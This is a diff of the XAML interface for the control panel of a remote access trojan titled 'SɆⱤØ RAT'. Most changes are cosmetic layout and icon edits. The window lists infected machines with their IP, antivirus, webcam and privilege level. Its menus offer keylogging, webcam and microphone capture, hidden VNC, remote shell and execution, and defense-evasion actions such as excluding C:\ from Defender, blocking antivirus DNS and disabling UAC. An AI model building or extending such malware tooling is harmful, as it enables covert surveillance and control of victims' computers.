@@ -1,4 +1,4 @@
-﻿<Window x:Class="SeroServer.UI.ServerWindow"
+<Window x:Class="SeroServer.UI.ServerWindow"
         xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
         xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
         Title="SɆⱤØ RAT"
@@ -33,7 +33,8 @@
 
         <Style TargetType="DataGridRow">
             <Setter Property="Background"      Value="Transparent" />
-            <Setter Property="BorderThickness" Value="0" />
+            <Setter Property="BorderThickness" Value="4,1,1,1" />
+            <Setter Property="BorderBrush"     Value="Transparent" />
             <Setter Property="Foreground"      Value="#DDE0F0" />
             <Style.Triggers>
                 <!-- Tagged rows: amber tint + amber left accent — evaluated first so selection overrides it -->
@@ -47,7 +48,6 @@
                         </Setter.Value>
                     </Setter>
                     <Setter Property="BorderBrush"     Value="#C8991A"/>
-                    <Setter Property="BorderThickness" Value="3,0,0,0"/>
                 </DataTrigger>
                 <Trigger Property="IsMouseOver" Value="True">
                     <Setter Property="Background" Value="#0F1525" />
@@ -64,7 +64,6 @@
                     </Setter>
                     <Setter Property="Foreground"      Value="#FFFFFF" />
                     <Setter Property="BorderBrush"     Value="#6AABFF" />
-                    <Setter Property="BorderThickness" Value="4,1,1,1" />
                 </Trigger>
                 <MultiTrigger>
                     <MultiTrigger.Conditions>
@@ -80,7 +79,6 @@
                         </Setter.Value>
                     </Setter>
                     <Setter Property="BorderBrush"     Value="#88C0FF" />
-                    <Setter Property="BorderThickness" Value="4,1,1,1" />
                 </MultiTrigger>
             </Style.Triggers>
         </Style>
@@ -197,7 +195,7 @@
                 <RowDefinition Height="3"  />
                 <RowDefinition Height="Auto" />
                 <RowDefinition Height="*"  />
-                <RowDefinition Height="28" />
+                <RowDefinition Height="100" />
             </Grid.RowDefinitions>
 
             <!-- ── Background ─────────────────────────────────────────── -->
@@ -290,7 +288,7 @@
                                     </LinearGradientBrush>
                                 </Run.Foreground>
                             </Run>
-                            <Run Text=" v1.3.1" Foreground="#C8922A" FontSize="10" FontWeight="Normal"/>
+                            <Run x:Name="TxtVersionNumber" Text=" v1.4.2" Foreground="#C8922A" FontSize="10" FontWeight="Normal"/>
                         </TextBlock>
                     </StackPanel>
 
@@ -363,31 +361,8 @@
                             VerticalAlignment="Center" HorizontalAlignment="Center">
                         <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                             <Grid Width="16" Height="16" VerticalAlignment="Center" Margin="0,0,6,0">
-                                <Ellipse x:Name="ServerPulse" Stroke="#EF4444" StrokeThickness="1.2"
-                                         Fill="Transparent" Opacity="0" RenderTransformOrigin="0.5,0.5">
-                                    <Ellipse.RenderTransform>
-                                        <ScaleTransform x:Name="PulseScale"/>
-                                    </Ellipse.RenderTransform>
-                                </Ellipse>
                                 <Ellipse x:Name="ServerDot" Width="7" Height="7" Fill="#EF4444"
                                          HorizontalAlignment="Center" VerticalAlignment="Center"/>
-                                <Grid.Triggers>
-                                    <EventTrigger RoutedEvent="Grid.Loaded">
-                                        <BeginStoryboard>
-                                            <Storyboard RepeatBehavior="Forever">
-                                                <DoubleAnimation Storyboard.TargetName="PulseScale"
-                                                                 Storyboard.TargetProperty="ScaleX"
-                                                                 From="0.4" To="2.2" Duration="0:0:1.4"/>
-                                                <DoubleAnimation Storyboard.TargetName="PulseScale"
-                                                                 Storyboard.TargetProperty="ScaleY"
-                                                                 From="0.4" To="2.2" Duration="0:0:1.4"/>
-                                                <DoubleAnimation Storyboard.TargetName="ServerPulse"
-                                                                 Storyboard.TargetProperty="Opacity"
-                                                                 From="0.65" To="0.0" Duration="0:0:1.4"/>
-                                            </Storyboard>
-                                        </BeginStoryboard>
-                                    </EventTrigger>
-                                </Grid.Triggers>
                             </Grid>
                             <TextBlock x:Name="TxtServerStatus" Text="Stopped"
                                        Foreground="#606880" FontSize="12" />
@@ -528,7 +503,10 @@
                                             <Grid.ColumnDefinitions><ColumnDefinition Width="4"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                             <Rectangle Grid.Column="0" Fill="#22C55E"/>
                                             <StackPanel Grid.Column="1" Margin="14,15,12,15">
-                                                <TextBlock Text="ONLINE" Foreground="#506070" FontSize="9" FontWeight="SemiBold"/>
+                                                <StackPanel Orientation="Horizontal" Margin="0,0,0,0">
+                                                    <TextBlock Text="&#xE839;" FontFamily="Segoe Fluent Icons, Segoe MDL2 Assets" Foreground="#22C55E" FontSize="11" Margin="0,0,6,0" VerticalAlignment="Center"/>
+                                                    <TextBlock Text="ONLINE" Foreground="#506070" FontSize="9" FontWeight="SemiBold" VerticalAlignment="Center"/>
+                                                </StackPanel>
                                                 <TextBlock x:Name="DashOnline" Text="0" Foreground="#22C55E" FontSize="34" FontWeight="Bold" Margin="0,5,0,0"/>
                                                 <TextBlock Text="connected now" Foreground="#25304A" FontSize="9" Margin="0,3,0,0"/>
                                             </StackPanel>
@@ -541,7 +519,10 @@
                                             <Grid.ColumnDefinitions><ColumnDefinition Width="4"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                             <Rectangle Grid.Column="0" Fill="#4A85F5"/>
                                             <StackPanel Grid.Column="1" Margin="14,15,12,15">
-                                                <TextBlock Text="TOTAL SEEN" Foreground="#506070" FontSize="9" FontWeight="SemiBold"/>
+                                                <StackPanel Orientation="Horizontal" Margin="0,0,0,0">
+                                                    <TextBlock Text="&#xE716;" FontFamily="Segoe Fluent Icons, Segoe MDL2 Assets" Foreground="#4A85F5" FontSize="11" Margin="0,0,6,0" VerticalAlignment="Center"/>
+                                                    <TextBlock Text="TOTAL SEEN" Foreground="#506070" FontSize="9" FontWeight="SemiBold" VerticalAlignment="Center"/>
+                                                </StackPanel>
                                                 <TextBlock x:Name="DashTotal" Text="0" Foreground="#4A85F5" FontSize="34" FontWeight="Bold" Margin="0,5,0,0"/>
                                                 <TextBlock Text="unique clients" Foreground="#25304A" FontSize="9" Margin="0,3,0,0"/>
                                             </StackPanel>
@@ -554,7 +535,10 @@
                                             <Grid.ColumnDefinitions><ColumnDefinition Width="4"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                             <Rectangle Grid.Column="0" Fill="#F59E0B"/>
                                             <StackPanel Grid.Column="1" Margin="14,15,12,15">
-                                                <TextBlock Text="NEW 24H" Foreground="#506070" FontSize="9" FontWeight="SemiBold"/>
+                                                <StackPanel Orientation="Horizontal" Margin="0,0,0,0">
+                                                    <TextBlock Text="&#xE945;" FontFamily="Segoe Fluent Icons, Segoe MDL2 Assets" Foreground="#F59E0B" FontSize="11" Margin="0,0,6,0" VerticalAlignment="Center"/>
+                                                    <TextBlock Text="NEW 24H" Foreground="#506070" FontSize="9" FontWeight="SemiBold" VerticalAlignment="Center"/>
+                                                </StackPanel>
                                                 <TextBlock x:Name="DashNew24h" Text="0" Foreground="#F59E0B" FontSize="34" FontWeight="Bold" Margin="0,5,0,0"/>
                                                 <TextBlock Text="connections today" Foreground="#25304A" FontSize="9" Margin="0,3,0,0"/>
                                             </StackPanel>
@@ -567,7 +551,10 @@
                                             <Grid.ColumnDefinitions><ColumnDefinition Width="4"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                             <Rectangle Grid.Column="0" Fill="#7C5CE8"/>
                                             <StackPanel Grid.Column="1" Margin="14,15,12,15">
-                                                <TextBlock Text="UPTIME" Foreground="#506070" FontSize="9" FontWeight="SemiBold"/>
+                                                <StackPanel Orientation="Horizontal" Margin="0,0,0,0">
+                                                    <TextBlock Text="&#xE121;" FontFamily="Segoe Fluent Icons, Segoe MDL2 Assets" Foreground="#7C5CE8" FontSize="11" Margin="0,0,6,0" VerticalAlignment="Center"/>
+                                                    <TextBlock Text="UPTIME" Foreground="#506070" FontSize="9" FontWeight="SemiBold" VerticalAlignment="Center"/>
+                                                </StackPanel>
                                                 <TextBlock x:Name="DashUptime" Text="--" Foreground="#7C5CE8" FontSize="20" FontWeight="Bold" Margin="0,5,0,0" TextWrapping="Wrap"/>
                                                 <TextBlock Text="server running" Foreground="#25304A" FontSize="9" Margin="0,3,0,0"/>
                                             </StackPanel>
@@ -675,7 +662,10 @@
                                     <Border Grid.Column="0" Background="#0A0D1A" CornerRadius="8" Margin="0,0,9,0"
                                             Padding="14,12" BorderThickness="1" BorderBrush="#1A1E36">
                                         <StackPanel>
-                                            <TextBlock Text="WEBCAM" Foreground="#506070" FontSize="9" FontWeight="SemiBold"/>
+                                            <StackPanel Orientation="Horizontal" Margin="0,0,0,0">
+                                                <TextBlock Text="&#xE114;" FontFamily="Segoe Fluent Icons, Segoe MDL2 Assets" Foreground="#F59E0B" FontSize="11" Margin="0,0,6,0" VerticalAlignment="Center"/>
+                                                <TextBlock Text="WEBCAM" Foreground="#506070" FontSize="9" FontWeight="SemiBold" VerticalAlignment="Center"/>
+                                            </StackPanel>
                                             <TextBlock x:Name="DashWebcam" Text="—" Foreground="#F59E0B" FontSize="22" FontWeight="Bold" Margin="0,5,0,0"/>
                                             <TextBlock Text="w/ camera" Foreground="#25304A" FontSize="9" Margin="0,2,0,0"/>
                                         </StackPanel>
@@ -684,7 +674,10 @@
                                     <Border Grid.Column="1" Background="#0A0D1A" CornerRadius="8" Margin="0,0,9,0"
                                             Padding="14,12" BorderThickness="1" BorderBrush="#1A1E36">
                                         <StackPanel>
-                                            <TextBlock Text="ADMIN" Foreground="#506070" FontSize="9" FontWeight="SemiBold"/>
+                                            <StackPanel Orientation="Horizontal" Margin="0,0,0,0">
+                                                <TextBlock Text="&#xEA18;" FontFamily="Segoe Fluent Icons, Segoe MDL2 Assets" Foreground="#EF4444" FontSize="11" Margin="0,0,6,0" VerticalAlignment="Center"/>
+                                                <TextBlock Text="ADMIN" Foreground="#506070" FontSize="9" FontWeight="SemiBold" VerticalAlignment="Center"/>
+                                            </StackPanel>
                                             <TextBlock x:Name="DashAdmin" Text="—" Foreground="#EF4444" FontSize="22" FontWeight="Bold" Margin="0,5,0,0"/>
                                             <TextBlock Text="elevated" Foreground="#25304A" FontSize="9" Margin="0,2,0,0"/>
                                         </StackPanel>
@@ -693,7 +686,10 @@
                                     <Border Grid.Column="2" Background="#0A0D1A" CornerRadius="8" Margin="0,0,9,0"
                                             Padding="14,12" BorderThickness="1" BorderBrush="#1A1E36">
                                         <StackPanel>
-                                            <TextBlock Text="TAGGED" Foreground="#506070" FontSize="9" FontWeight="SemiBold"/>
+                                            <StackPanel Orientation="Horizontal" Margin="0,0,0,0">
+                                                <TextBlock Text="&#xE8EC;" FontFamily="Segoe Fluent Icons, Segoe MDL2 Assets" Foreground="#C8991A" FontSize="11" Margin="0,0,6,0" VerticalAlignment="Center"/>
+                                                <TextBlock Text="TAGGED" Foreground="#506070" FontSize="9" FontWeight="SemiBold" VerticalAlignment="Center"/>
+                                            </StackPanel>
                                             <TextBlock x:Name="DashTagged" Text="0" Foreground="#C8991A" FontSize="22" FontWeight="Bold" Margin="0,5,0,0"/>
                                             <TextBlock Text="marked clients" Foreground="#25304A" FontSize="9" Margin="0,2,0,0"/>
                                         </StackPanel>
@@ -702,7 +698,10 @@
                                     <Border Grid.Column="3" Background="#0A0D1A" CornerRadius="8"
                                             Padding="14,12" BorderThickness="1" BorderBrush="#1A1E36">
                                         <StackPanel>
-                                            <TextBlock Text="TOP COUNTRY" Foreground="#506070" FontSize="9" FontWeight="SemiBold"/>
+                                            <StackPanel Orientation="Horizontal" Margin="0,0,0,0">
+                                                <TextBlock Text="&#xE12B;" FontFamily="Segoe Fluent Icons, Segoe MDL2 Assets" Foreground="#506070" FontSize="11" Margin="0,0,6,0" VerticalAlignment="Center"/>
+                                                <TextBlock Text="TOP COUNTRY" Foreground="#506070" FontSize="9" FontWeight="SemiBold" VerticalAlignment="Center"/>
+                                            </StackPanel>
                                             <TextBlock x:Name="DashTopCountry" Text="—" Foreground="#DDE0F0" FontSize="16" FontWeight="Bold" Margin="0,5,0,0" TextWrapping="Wrap"/>
                                             <TextBlock Text="by connections" Foreground="#25304A" FontSize="9" Margin="0,2,0,0"/>
                                         </StackPanel>
@@ -740,13 +739,18 @@
                                     BorderBrush="#1E2038" BorderThickness="0,0,0,1">
                                 <Grid>
                                     <Grid.ColumnDefinitions>
-                                        <ColumnDefinition Width="40" />
+                                        <ColumnDefinition Width="Auto" />
+                                        <ColumnDefinition Width="30" />
                                         <ColumnDefinition Width="*" />
+                                        <ColumnDefinition Width="40" />
                                     </Grid.ColumnDefinitions>
-                                    <TextBlock Grid.Column="0" Text="⌕" FontSize="16"
+                                    <Border Grid.Column="0" x:Name="BorderSelectedCount" Background="#151A35" BorderBrush="#253560" BorderThickness="1" CornerRadius="4" Padding="8,4" Margin="10,0,0,0" VerticalAlignment="Center" Visibility="Collapsed">
+                                        <TextBlock x:Name="TxtSelectedCount" Foreground="#4A85F5" FontSize="11" FontFamily="Segoe UI" FontWeight="Bold" VerticalAlignment="Center" />
+                                    </Border>
+                                    <TextBlock Grid.Column="1" Text="⌕" FontSize="16"
                                                HorizontalAlignment="Center" VerticalAlignment="Center"
                                                Foreground="#606880" />
-                                    <TextBox Grid.Column="1" x:Name="TxtSearch"
+                                    <TextBox Grid.Column="2" x:Name="TxtSearch"
                                              Background="Transparent" Foreground="#DDE0F0"
                                              BorderThickness="0" Padding="0,9"
                                              FontSize="12" CaretBrush="#4A85F5" SelectionBrush="#4A85F5"
@@ -772,182 +776,270 @@
                                             </ControlTemplate>
                                         </TextBox.Template>
                                     </TextBox>
+                                    <Button Grid.Column="3" x:Name="BtnGridSettings" Content="⚙" FontSize="16"
+                                            Foreground="#606880" Cursor="Hand" Click="BtnGridSettings_Click" ToolTip="Grid Settings &amp; Filters">
+                                        <Button.Template>
+                                            <ControlTemplate TargetType="Button">
+                                                <Border x:Name="bd" Background="Transparent" Padding="10,0">
+                                                    <TextBlock x:Name="tb" Text="{TemplateBinding Content}" FontSize="16" Foreground="{TemplateBinding Foreground}"
+                                                               HorizontalAlignment="Center" VerticalAlignment="Center"/>
+                                                </Border>
+                                                <ControlTemplate.Triggers>
+                                                    <Trigger Property="IsMouseOver" Value="True">
+                                                        <Setter TargetName="tb" Property="Foreground" Value="#4A85F5"/>
+                                                    </Trigger>
+                                                </ControlTemplate.Triggers>
+                                            </ControlTemplate>
+                                        </Button.Template>
+                                    </Button>
                                 </Grid>
                             </Border>
 
-                            <DataGrid Grid.Row="1" x:Name="GridClients"
-                                      AutoGenerateColumns="False" IsReadOnly="True"
-                                      PreviewKeyDown="GridClients_PreviewKeyDown"
-                                      Background="Transparent" Foreground="#DDE0F0"
-                                      BorderThickness="0" RowBackground="Transparent"
-                                      AlternatingRowBackground="#07101428"
-                                      GridLinesVisibility="None" HeadersVisibility="Column"
-                                      FontSize="12" SelectionMode="Extended" CanUserAddRows="False"
-                                      VirtualizingStackPanel.IsVirtualizing="True"
-                                      VirtualizingStackPanel.VirtualizationMode="Recycling"
-                                      EnableColumnVirtualization="True"
-                                      ScrollViewer.CanContentScroll="True"
-                                      ScrollViewer.HorizontalScrollBarVisibility="Auto"
+                            <Grid Grid.Row="1">
+                                <Grid.ColumnDefinitions>
+                                    <ColumnDefinition Width="*" />
+                                    <ColumnDefinition Width="Auto" />
+                                </Grid.ColumnDefinitions>
+
+                                <DataGrid Grid.Column="0" x:Name="GridClients"
+                                          AutoGenerateColumns="False" IsReadOnly="True"
+                                          PreviewKeyDown="GridClients_PreviewKeyDown"
+                                          Sorting="GridClients_Sorting"
+                                          SelectionChanged="GridClients_SelectionChanged"
+                                          Background="Transparent" Foreground="#DDE0F0"
+                                          BorderThickness="0" RowBackground="Transparent"
+                                          AlternatingRowBackground="#07101428"
+                                          GridLinesVisibility="None" HeadersVisibility="Column"
+                                          FontSize="12" SelectionMode="Extended" CanUserAddRows="False"
+                                          VirtualizingStackPanel.IsVirtualizing="True"
+                                          VirtualizingStackPanel.VirtualizationMode="Recycling"
+                                          EnableColumnVirtualization="True"
+                                          ScrollViewer.CanContentScroll="True"
+                                          ScrollViewer.HorizontalScrollBarVisibility="Auto"
                                       ColumnHeaderStyle="{StaticResource SColHeader}">
-                                <DataGrid.Columns>
-                                    <DataGridTemplateColumn Header="ID" Width="96" SortMemberPath="Id">
-                                        <DataGridTemplateColumn.CellTemplate>
-                                            <DataTemplate>
-                                                <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
-                                                                    <Grid Width="28" Height="20" Margin="0,0,7,0" VerticalAlignment="Center">
-                                                        <Border Background="#252840" CornerRadius="2">
-                                                            <TextBlock Text="?" Foreground="#505878" FontSize="9"
-                                                                       FontFamily="Segoe UI" FontWeight="SemiBold"
-                                                                       HorizontalAlignment="Center" VerticalAlignment="Center"/>
-                                                        </Border>
-                                                        <Image Source="{Binding FlagImage}" Width="28" Height="20"
-                                                               RenderOptions.BitmapScalingMode="HighQuality"
-                                                               SnapsToDevicePixels="True"/>
-                                                        <Border CornerRadius="2" IsHitTestVisible="False">
-                                                            <Border.Background>
-                                                                <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
-                                                                    <GradientStop Color="#48FFFFFF" Offset="0"/>
-                                                                    <GradientStop Color="#18FFFFFF" Offset="0.45"/>
-                                                                    <GradientStop Color="#00FFFFFF" Offset="0.46"/>
-                                                                    <GradientStop Color="#06FFFFFF" Offset="1"/>
-                                                                </LinearGradientBrush>
-                                                            </Border.Background>
-                                                        </Border>
-                                                        <Border BorderBrush="#28FFFFFF" BorderThickness="0.5" CornerRadius="2" IsHitTestVisible="False"/>
-                                                    </Grid>
-                                                    <TextBlock Text="{Binding Id}" FontFamily="Consolas" FontSize="11"
-                                                               VerticalAlignment="Center"/>
-                                                </StackPanel>
-                                            </DataTemplate>
-                                        </DataGridTemplateColumn.CellTemplate>
-                                    </DataGridTemplateColumn>
-                                    <DataGridTextColumn Header="USER"      Binding="{Binding Username}"                           Width="110" />
-                                    <DataGridTextColumn Header="IP"        Binding="{Binding IP}"                                 Width="110" FontFamily="Consolas" FontSize="11"/>
-                                    <DataGridTextColumn Header="PRIV"      Binding="{Binding Privilege}"                          Width="52"  FontSize="11"/>
-                                    <DataGridTextColumn Header="COUNTRY"   Binding="{Binding CountryDisplay}"                     Width="115" />
-                                    <DataGridTextColumn Header="MACHINE"   Binding="{Binding MachineName}"                        Width="120" />
-                                    <DataGridTextColumn Header="OS"        Binding="{Binding OS}"                                 Width="115" />
-                                    <DataGridTextColumn Header="AV"        Binding="{Binding Antivirus}"                          Width="100" FontSize="11"/>
-                                    <DataGridTextColumn Header="PAYLOAD"   Binding="{Binding Payload}"                            Width="95"  FontSize="11"/>
-                                    <DataGridTextColumn Header="1ST SEEN"  Binding="{Binding FirstSeen, StringFormat=yyyy-MM-dd}" Width="84"  FontFamily="Consolas" FontSize="11"/>
-                                    <DataGridTextColumn Header="CPU"      Binding="{Binding CpuDisplay}"   Width="130" FontSize="11"/>
-                                    <DataGridTextColumn Header="GPU"      Binding="{Binding GpuDisplay}"   Width="130" FontSize="11"/>
-                                    <DataGridTextColumn Header="RAM"      Binding="{Binding RamDisplay}"   Width="105" FontFamily="Consolas" FontSize="11"/>
-                                    <DataGridTextColumn Header="CAM"       Binding="{Binding CameraIcon}"   Width="44"  FontSize="13"/>
-                                    <DataGridTextColumn Header="WINDOW"    Binding="{Binding ActiveWindow}" Width="140" />
-                                    <DataGridTemplateColumn Header="TAG" Width="100" SortMemberPath="Tag">
-                                        <DataGridTemplateColumn.CellTemplate>
-                                            <DataTemplate>
-                                                <Border x:Name="TagBadge" CornerRadius="3" Padding="6,2"
-                                                        Background="#221700" BorderBrush="#5A3E08" BorderThickness="1"
-                                                        HorizontalAlignment="Left" Margin="2,0" Visibility="Collapsed">
-                                                    <StackPanel Orientation="Horizontal">
-                                                        <TextBlock Text="&#x1F3F7;" FontSize="9" Margin="0,0,4,0" VerticalAlignment="Center"/>
-                                                        <TextBlock Text="{Binding Tag}" Foreground="#D4A843"
-                                                                   FontSize="10" FontWeight="SemiBold" FontFamily="Segoe UI"
+                                    <DataGrid.Columns>
+                                        <DataGridTemplateColumn Header="ID" Width="96" SortMemberPath="Id">
+                                            <DataGridTemplateColumn.CellTemplate>
+                                                <DataTemplate>
+                                                    <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
+                                                                        <Grid Width="28" Height="20" Margin="0,0,7,0" VerticalAlignment="Center">
+                                                            <Border Background="#252840" CornerRadius="2">
+                                                                <TextBlock Text="?" Foreground="#505878" FontSize="9"
+                                                                           FontFamily="Segoe UI" FontWeight="SemiBold"
+                                                                           HorizontalAlignment="Center" VerticalAlignment="Center"/>
+                                                            </Border>
+                                                            <Image Source="{Binding FlagImage}" Width="28" Height="20"
+                                                                   RenderOptions.BitmapScalingMode="HighQuality"
+                                                                   SnapsToDevicePixels="True"/>
+                                                            <Border CornerRadius="2" IsHitTestVisible="False">
+                                                                <Border.Background>
+                                                                    <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
+                                                                        <GradientStop Color="#48FFFFFF" Offset="0"/>
+                                                                        <GradientStop Color="#18FFFFFF" Offset="0.45"/>
+                                                                        <GradientStop Color="#00FFFFFF" Offset="0.46"/>
+                                                                        <GradientStop Color="#06FFFFFF" Offset="1"/>
+                                                                    </LinearGradientBrush>
+                                                                </Border.Background>
+                                                            </Border>
+                                                            <Border BorderBrush="#28FFFFFF" BorderThickness="0.5" CornerRadius="2" IsHitTestVisible="False"/>
+                                                        </Grid>
+                                                        <TextBlock Text="{Binding Id}" FontFamily="Consolas" FontSize="11"
                                                                    VerticalAlignment="Center"/>
                                                     </StackPanel>
-                                                </Border>
-                                                <DataTemplate.Triggers>
-                                                    <DataTrigger Binding="{Binding HasTag}" Value="True">
-                                                        <Setter TargetName="TagBadge" Property="Visibility" Value="Visible"/>
-                                                    </DataTrigger>
-                                                </DataTemplate.Triggers>
-                                            </DataTemplate>
-                                        </DataGridTemplateColumn.CellTemplate>
-                                    </DataGridTemplateColumn>
-                                    <DataGridTemplateColumn Header="PING"  Width="70" MinWidth="50" SortMemberPath="PingMs">
-                                        <DataGridTemplateColumn.CellTemplate>
-                                            <DataTemplate>
-                                                <TextBlock Text="{Binding PingDisplay}" Foreground="{Binding PingBrush}"
-                                                           FontFamily="Consolas" FontSize="11" VerticalAlignment="Center" Margin="10,0" />
-                                            </DataTemplate>
-                                        </DataGridTemplateColumn.CellTemplate>
-                                    </DataGridTemplateColumn>
-                                </DataGrid.Columns>
-                                <DataGrid.ContextMenu>
-                                    <ContextMenu>
-                                        <!-- Administration -->
-                                        <MenuItem Header="Administration">
-                                            <MenuItem.Icon><TextBlock Text="&#x1F4BC;" FontSize="11" Foreground="#89b4fa"/></MenuItem.Icon>
-                                            <MenuItem Header="Remote Shell"       Click="RemoteShell_Click">       <MenuItem.Icon><TextBlock Text="&gt;_" FontSize="10" FontFamily="Consolas" FontWeight="Bold" Foreground="#89b4fa"/></MenuItem.Icon></MenuItem>
-                                            <MenuItem Header="File Manager"       Click="FileManager_Click">       <MenuItem.Icon><TextBlock Text="&#x1F4C2;" FontSize="11" Foreground="#89b4fa"/></MenuItem.Icon></MenuItem>
-                                            <MenuItem Header="Process Manager"    Click="ProcessManager_Click">    <MenuItem.Icon><TextBlock Text="&#x2699;" FontSize="11" Foreground="#4A85F5"/></MenuItem.Icon></MenuItem>
-                                            <MenuItem Header="Startup Manager"    Click="StartupManager_Click">    <MenuItem.Icon><TextBlock Text="&#x1F680;" FontSize="11" Foreground="#a6e3a1"/></MenuItem.Icon></MenuItem>
-                                            <MenuItem Header="TCP Connections"    Click="TcpManager_Click">        <MenuItem.Icon><TextBlock Text="&#x1F310;" FontSize="11" Foreground="#89b4fa"/></MenuItem.Icon></MenuItem>
-                                                            <MenuItem x:Name="MenuItemSvcMgr" Header="Service Manager" Click="ServiceManager_Click"><MenuItem.Icon><Image x:Name="SvcMgrMenuIcon" Width="15" Height="15" RenderOptions.BitmapScalingMode="HighQuality"/></MenuItem.Icon></MenuItem>
-                                            <MenuItem Header="Window Manager"     Click="WindowManager_Click">     <MenuItem.Icon><TextBlock Text="&#x1FA9F;" FontSize="11" FontFamily="Segoe UI Emoji"/></MenuItem.Icon></MenuItem>
-                                            <MenuItem Header="Registry Editor"    Click="RegistryEditor_Click">    <MenuItem.Icon><TextBlock Text="&#x1F5C4;" FontSize="11" Foreground="#f9e2af"/></MenuItem.Icon></MenuItem>
-                                            <MenuItem Header="Installed Programs" Click="InstalledApps_Click">     <MenuItem.Icon><TextBlock Text="&#x1F4E6;" FontSize="11" Foreground="#a6e3a1"/></MenuItem.Icon></MenuItem>
-                                            <MenuItem Header="Device Manager"     Click="DeviceManager_Click">     <MenuItem.Icon><TextBlock Text="&#x1F50C;" FontSize="11" Foreground="#89b4fa"/></MenuItem.Icon></MenuItem>
-                                            <MenuItem Header="SOCKS5 Proxy"       Click="Socks5_Click">            <MenuItem.Icon><TextBlock Text="&#x1F517;" FontSize="11" Foreground="#22C55E"/></MenuItem.Icon></MenuItem>
-                                            <Separator/>
-                                            <MenuItem Header="Remote Execute"     Click="RemoteFileExec_Click">    <MenuItem.Icon><TextBlock Text="&#x26A1;" FontSize="11" Foreground="#f9e2af"/></MenuItem.Icon></MenuItem>
-                                        </MenuItem>
-                                        <!-- Monitoring -->
-                                        <MenuItem Header="Monitoring">
-                                            <MenuItem.Icon><TextBlock Text="&#x1F575;" FontSize="11" Foreground="#89dceb"/></MenuItem.Icon>
-                                            <MenuItem Header="Remote Desktop"      Click="RemoteDesktop_Click">       <MenuItem.Icon><TextBlock Text="&#x1F5A5;" FontSize="11" Foreground="#89b4fa"/></MenuItem.Icon></MenuItem>
-                                            <MenuItem Header="Webcam"              Click="RemoteWebcam_Click">        <MenuItem.Icon><Grid Width="15" Height="15"><TextBlock Text="📷" FontSize="11" HorizontalAlignment="Center" VerticalAlignment="Center" Foreground="#89dceb"/><Image x:Name="CamMenuIcon" Width="15" Height="15" RenderOptions.BitmapScalingMode="HighQuality"/></Grid></MenuItem.Icon></MenuItem>
-                                            <MenuItem Header="HVNC"                Click="Hvnc_Click">                <MenuItem.Icon><TextBlock Text="&#x1F48E;" FontSize="11" Foreground="#A855F7"/></MenuItem.Icon></MenuItem>
-                                            <MenuItem Header="Microphone"          Click="Microphone_Click">          <MenuItem.Icon><Grid Width="15" Height="15"><TextBlock Text="&#x1F399;" FontSize="11" HorizontalAlignment="Center" VerticalAlignment="Center" Foreground="#f38ba8"/><Image x:Name="MicMenuIcon" Width="15" Height="15" RenderOptions.BitmapScalingMode="HighQuality"/></Grid></MenuItem.Icon></MenuItem>
-                                            <MenuItem Header="Keylogger"           Click="Keylogger_Click">           <MenuItem.Icon><TextBlock Text="&#x2328;" FontSize="11" Foreground="#cba6f7"/></MenuItem.Icon></MenuItem>
-                                            <Separator/>
-                                            <MenuItem Header="Performance Monitor" Click="PerformanceMonitor_Click">  <MenuItem.Icon><TextBlock Text="&#x1F4CA;" FontSize="11" Foreground="#22C55E"/></MenuItem.Icon></MenuItem>
-                                        </MenuItem>
-                                        <!-- Miscellaneous -->
-                                        <MenuItem Header="Miscellaneous">
-                                            <MenuItem.Icon><TextBlock Text="&#x1F527;" FontSize="11" Foreground="#606880"/></MenuItem.Icon>
-                                            <MenuItem Header="Exclude C:\ (Defender)" Click="QuickExcludeCDrive_Click"><MenuItem.Icon><TextBlock Text="&#x1F6E1;" FontSize="11" Foreground="#a6e3a1"/></MenuItem.Icon></MenuItem>
-                                            <MenuItem Header="Block AV DNS"        Click="QuickBlockAvDns_Click">     <MenuItem.Icon><TextBlock Text="&#x1F6AB;" FontSize="11" Foreground="#f38ba8"/></MenuItem.Icon></MenuItem>
-                                            <MenuItem Header="Block WSReset"       Click="QuickBlockReset_Click">     <MenuItem.Icon><TextBlock Text="&#x1F512;" FontSize="11" Foreground="#f38ba8"/></MenuItem.Icon></MenuItem>
-                                            <MenuItem Header="Disable UAC"         Click="QuickDisableUac_Click" ToolTip="EnableLUA=0 (admin required, takes effect after reboot)"><MenuItem.Icon><TextBlock Text="&#x26A0;" FontSize="11" Foreground="#f9e2af"/></MenuItem.Icon></MenuItem>
-                                            <Separator/>
-                                            <MenuItem Header="Run BotKiller"       Click="BotKiller_Click" ToolTip="Kill unsigned random-name processes"><MenuItem.Icon><TextBlock Text="&#x2620;" FontSize="11" Foreground="#f38ba8"/></MenuItem.Icon></MenuItem>
-                                        </MenuItem>
-                                        <!-- Fun -->
-                                        <MenuItem Header="Fun">
-                                            <MenuItem.Icon><TextBlock Text="&#x1F3AE;" FontSize="11" Foreground="#f9e2af"/></MenuItem.Icon>
-                                            <MenuItem Header="Fun Panel"   Click="Fun_Click">       <MenuItem.Icon><TextBlock Text="&#x1F3AD;" FontSize="11" Foreground="#f9e2af"/></MenuItem.Icon></MenuItem>
-                                            <Separator/>
-                                            <MenuItem Header="TikTok Bot"  Click="TikTok_Click">    <MenuItem.Icon><Image Source="/tiktok.png" Width="14" Height="14" RenderOptions.BitmapScalingMode="HighQuality"/></MenuItem.Icon></MenuItem>
-                                        </MenuItem>
-                                        <Separator />
-                                        <!-- Client Management -->
-                                        <MenuItem Header="Client Management">
-                                            <MenuItem.Icon><TextBlock Text="&#x1F464;" FontSize="11" Foreground="#606880"/></MenuItem.Icon>
